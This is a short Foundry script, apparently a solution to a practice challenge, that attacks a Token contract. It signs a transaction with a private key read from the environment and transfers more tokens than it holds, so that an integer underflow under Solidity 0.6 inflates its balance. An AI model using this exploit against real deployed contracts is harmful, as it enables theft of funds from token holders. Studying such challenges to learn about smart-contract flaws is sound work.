// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "../src/Token.sol";

contract TokenAttackScript is Script {
    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PK");
        address myAddress = vm.envAddress("MY_ADDRESS");
        address tokenAddress = vm.envAddress("TOKEN_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);
        Token(tokenAddress).transfer(address(0), 22);
        console.log('New bal', Token(tokenAddress).balanceOf(myAddress));
        vm.stopBroadcast();
    }
}
